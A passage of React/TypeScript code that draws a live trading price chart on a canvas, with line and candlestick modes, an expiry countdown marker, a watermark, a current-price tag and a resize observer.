          ctx.beginPath(); ctx.moveTo(xEx, 0); ctx.lineTo(xEx, H); ctx.stroke();
          ctx.setLineDash([]);

          const remSec = Math.max(0, Math.round((exMs - now) / 1000));
          if (remSec > 0) {
            const timeStr = remSec >= 60 ? `${Math.floor(remSec / 60)}m${remSec % 60}s` : `${remSec}s`;
            ctx.font = "bold 11px monospace";
            const tw = ctx.measureText(timeStr).width + 14;
            ctx.fillStyle = `${solid}0.92)`;
            if (ctx.roundRect) ctx.roundRect(xEx - tw / 2, 5, tw, 20, 4);
            else ctx.rect(xEx - tw / 2, 5, tw, 20);
            ctx.fill();
            ctx.fillStyle = "#fff"; ctx.textAlign = "center";
            ctx.fillText(timeStr, xEx, 19);
            ctx.textAlign = "left";
          }
        }
      }

      // ── Chart data (line or candle) ───────────────────────────────────────
      // lastP / firstP / livePrice already computed above (bounds section)

      const up     = livePrice >= firstP;
      const lc     = up ? "#10b981" : "#ef4444";

      if (cm === "line") {
        // Build draw points: historical ticks + a 60-fps smoothstep live point.
        // Between each 500ms tick, the live point smoothly interpolates from
        // prevPrice → curPrice using an ease-in-out curve, so the line grows
        // continuously at 60fps without waiting for the next tick.
        const drawPts  = [...vis, { t: now, p: livePrice }];
        const N        = drawPts.length;

        function smoothPath(pts: typeof drawPts) {
          if (pts.length < 2) return;
          ctx!.moveTo(toX(pts[0].t), toY(pts[0].p));
          for (let i = 1; i < pts.length - 1; i++) {
            const cx = toX(pts[i].t),     cy = toY(pts[i].p);
            const mx = (cx + toX(pts[i + 1].t)) / 2;
            const my = (cy + toY(pts[i + 1].p)) / 2;
            ctx!.quadraticCurveTo(cx, cy, mx, my);
          }
          ctx!.lineTo(toX(pts[pts.length - 1].t), toY(pts[pts.length - 1].p));
        }

        // Area fill
        const grd = ctx.createLinearGradient(0, 0, 0, H);
        grd.addColorStop(0, up ? "rgba(16,185,129,0.12)" : "rgba(239,68,68,0.12)");
        grd.addColorStop(1, "transparent");
        ctx.fillStyle = grd;
        ctx.beginPath();
        smoothPath(drawPts);
        ctx.lineTo(toX(drawPts[N - 1].t), H);
        ctx.lineTo(toX(drawPts[0].t), H);
        ctx.closePath();
        ctx.fill();

        // Line stroke
        ctx.strokeStyle = lc; ctx.lineWidth = 1.8; ctx.lineJoin = "round";
        ctx.beginPath();
        smoothPath(drawPts);
        ctx.stroke();

      } else {
        // Candle chart — each candle is anchored to a FIXED absolute time bucket
        // so that old candles never change shape when new ticks arrive.
        // Old approach grouped by index-in-vis, meaning every new tick reshuffled
        // all group memberships and caused every candle to reshape every 500 ms.
        const tpc            = TICKS_PER_CANDLE[tf] ?? 1;
        const candlePeriodMs = TICK_MS * tpc;
        const pxPerMs        = W / wDur;
        const candleW        = Math.max(2, pxPerMs * candlePeriodMs * 0.76);
        const halfCandle     = candleW / 2;

        // Build map: absolute bucket index → prices[]
        const candleMap = new Map<number, number[]>();
        for (const tick of vis) {
          const key = Math.floor(tick.t / candlePeriodMs);
          if (!candleMap.has(key)) candleMap.set(key, []);
          candleMap.get(key)!.push(tick.p);
        }

        for (const [key, prices] of [...candleMap.entries()].sort((a, b) => a[0] - b[0])) {
          const open   = prices[0];
          const close  = prices[prices.length - 1];
          const high   = Math.max(...prices);
          const low    = Math.min(...prices);
          // Center the candle at the middle of its fixed bucket window
          const x      = toX(key * candlePeriodMs + candlePeriodMs * 0.5);
          const green  = close >= open;
          const col    = green ? "#10b981" : "#ef4444";
          const yO     = toY(open);
          const yC     = toY(close);
          const bodyT  = Math.min(yO, yC);
          const bodyH  = Math.max(1.5, Math.abs(yC - yO));
          const yH     = toY(high);
          const yL     = toY(low);

          ctx.strokeStyle = col;
          ctx.lineWidth   = 1;

          // High wick
          if (yH < bodyT) { ctx.beginPath(); ctx.moveTo(x, yH); ctx.lineTo(x, bodyT); ctx.stroke(); }
          // Low wick
          if (yL > bodyT + bodyH) { ctx.beginPath(); ctx.moveTo(x, bodyT + bodyH); ctx.lineTo(x, yL); ctx.stroke(); }

          // Body — hollow for doji (very small body), filled otherwise
          ctx.fillStyle = col;
          if (bodyH <= 2) {
            ctx.fillRect(x - halfCandle, bodyT - 0.5, candleW, 2);
          } else if (green) {
            ctx.strokeRect(x - halfCandle, bodyT, candleW, bodyH);
          } else {
            ctx.fillRect(x - halfCandle, bodyT, candleW, bodyH);
          }
        }
      }

      // ── Watermark ────────────────────────────────────────────────────────
      ctx.save(); ctx.globalAlpha = 0.03; ctx.fillStyle = "#fff";
      ctx.font = "bold 52px Arial"; ctx.textAlign = "center";
      ctx.fillText("PRIME BROKER", W / 2, H / 2 + 18);
      ctx.restore();

      // ── Current price dashed reference ───────────────────────────────────
      // In line mode use livePrice (the smoothstep-interpolated point at t=now)
      // so the dot, reference line, and price tag all sit at the tip of the line.
      const displayP = cm === "line" ? livePrice : lastP;
      const curY = toY(displayP);
      ctx.strokeStyle = up ? "rgba(16,185,129,0.3)" : "rgba(239,68,68,0.3)";
      ctx.lineWidth   = 1; ctx.setLineDash([3, 5]);
      ctx.beginPath(); ctx.moveTo(0, curY); ctx.lineTo(W, curY); ctx.stroke();
      ctx.setLineDash([]);

      // Dot — placed at the tip of the line (t=now in line mode, last tick in candle mode)
      const dotX = cm === "line" ? Math.min(toX(now), W - 4) : toX(vis[VIS - 1].t);
      ctx.fillStyle = lc;
      ctx.beginPath(); ctx.arc(dotX, curY, 3.5, 0, Math.PI * 2); ctx.fill();

      // Price tag
      const tag = displayP.toLocaleString("en-US", { minimumFractionDigits: dec, maximumFractionDigits: dec });
      ctx.font = "bold 11px monospace";
      const tw = ctx.measureText(tag).width + 10;
      const ty = Math.max(13, Math.min(curY, H - 4));
      ctx.fillStyle = lc;
      ctx.fillRect(W - tw - 2, ty - 11, tw, 14);
      ctx.fillStyle = "#000"; ctx.textAlign = "left";
      ctx.fillText(tag, W - tw + 3, ty);

      rafRef.current = requestAnimationFrame(draw);
    }

    rafRef.current = requestAnimationFrame(draw);
    return () => cancelAnimationFrame(rafRef.current);
  }, [asset]);

  // ── 6. Resize observer ─────────────────────────────────────────────────────
  useEffect(() => {
    const canvas = canvasRef.current;
    if (!canvas) return;
    const ro = new ResizeObserver(() => {
      canvas.width  = canvas.offsetWidth;
      canvas.height = canvas.offsetHeight;
    });
    ro.observe(canvas);
    canvas.width  = canvas.offsetWidth;
    canvas.height = canvas.offsetHeight;
    return () => ro.disconnect();
  }, []);

  return <canvas ref={canvasRef} className="w-full h-full block" />;
}
